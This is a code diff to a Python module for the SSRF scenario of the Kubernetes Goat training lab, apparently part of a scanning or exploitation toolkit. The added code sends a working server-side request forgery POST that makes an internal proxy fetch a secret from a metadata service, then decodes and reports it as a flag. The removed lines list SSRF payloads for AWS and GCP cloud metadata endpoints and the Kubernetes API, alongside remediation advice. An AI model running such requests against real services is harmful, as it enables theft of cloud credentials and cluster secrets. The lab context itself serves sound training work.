@@ -1,45 +1,82 @@
-
 import requests
+import base64
+import json
+import time
 
 def run(target_url: str) -> dict:
     """
-    Scenario 3: SSRF in the Kubernetes (K8S) world
+    Scenario 3: SSRF
+    Refactored for pure Python execution (no kubectl required).
+    Target: Internal Proxy Service (exposed on port 3000 / host 1232)
+    Goal: Access http://metadata-db/latest/secrets/kubernetes-goat
     """
     target = target_url.rstrip('/')
     
-    is_vulnerable = False
-    details = ""
+    # Helper for Docker container connectivity
+    def get_accessible_target(t):
+        if "127.0.0.1" in t or "localhost" in t:
+            try:
+                requests.get(t, timeout=2)
+                return t
+            except:
+                # Try Gateway
+                t_alt = t.replace("127.0.0.1", "172.17.0.1").replace("localhost", "172.17.0.1")
+                try:
+                    requests.get(t_alt, timeout=2)
+                    return t_alt
+                except:
+                    return t
+        return t
 
+    target = get_accessible_target(target)
+
+    # Payload to trigger SSRF
+    # The internal proxy expects a POST with JSON body: {"endpoint": "URL", "method": "GET"}
+    metadata_url = "http://metadata-db/latest/secrets/kubernetes-goat"
+    
+    payload = {
+        "endpoint": metadata_url,
+        "method": "GET"
+    }
+    
     try:
-        # SSRF app (internal-proxy) on 1232 often reflects input or shows "K8S Goat" style
-        r = requests.get(target, timeout=5)
-        # Unique identifier for the SSRF scenario app
-        if r.status_code == 200 and ("internal-proxy" in r.text.lower() or "galery" in r.text.lower() or ":1232" in target):
-            is_vulnerable = True
-            details = "Service appears to be the Internal Proxy application (SSRF Target)."
-    except:
-        pass
-
-    if is_vulnerable:
-        return {
-            "success": True,
-            "output": f"""[+] VULNERABILITY DETECTED: SSRF Potential
+        # Send SSRF Request
+        r = requests.post(target, json=payload, timeout=10)
+        output = r.text
+        
+        # Check success
+        decoded_flag = ""
+        success = False
+        
+        # Try to decode if we see appropriate structure
+        # Expected: {"metadata":..., "data": "base64..."}
+        if "data" in output:
+            try:
+                if isinstance(r.json(), dict) and "data" in r.json():
+                     b64_data = r.json()["data"]
+                     decoded_flag = base64.b64decode(b64_data).decode('utf-8', errors='ignore')
+            except:
+                 pass
+        
+        if "azhzLWdvYXQt" in output or "k8s-goat" in output or "k8s-goat" in decoded_flag:
+             return {
+                 "success": True,
+                 "output": f"""[+] VULNERABILITY DETECTED: SSRF (Server Side Request Forgery)
 Target: {target}
-Details: {details}
+[VERIFIED] Successfully accessed metadata-db via Internal Proxy!
+Endpoint: {metadata_url}
+Response Headers: {r.headers}
 
-[How to Exploit]
-1. Identification: Observe the application takes a URL verification parameter (e.g., `?url=...`).
-2. Cloud Metadata: Attempt to access Cloud Metadata service.
-   AWS: `?url=http://169.254.169.254/latest/meta-data/`
-   GCP: `?url=http://metadata.google.internal/computeMetadata/v1/`
-3. K8s Internal: Scan internal K8s services (e.g., Etcd, Kube-API).
-   Payload: `?url=http://kubernetes.default.svc`
-
-[How to Fix]
-1. Input Validation: Whitelist allowed domains/protocols for the proxy.
-2. Network Policy: Use Kubernetes NetworkPolicies to restrict the pod's egress traffic (deny access to 169.254.169.254 or internal CIDRs).
-3. Service Mesh: Use Istio/Linkerd to control egress traffic.
+[Result]
+Raw Response Snippet: {output[:100]}...
+Decoded Flag: {decoded_flag if decoded_flag else "Could not auto-decode, but signature found."}
 """
-        }
-    else:
-        return {"success": False, "output": f"[-] Target {target} is not the SSRF Vulnerable service."}
+             }
+        else:
+             return {
+                 "success": False, 
+                 "output": f"[-] SSRF Request sent to {target} but flag not found.\nOutput: {output[:200]}\nPayload sent: {json.dumps(payload)}\nResolved Target: {target}"
+             }
+
+    except Exception as e:
+        return {"success": False, "output": f"[-] Exception communicating with Proxy {target}: {str(e)}"}
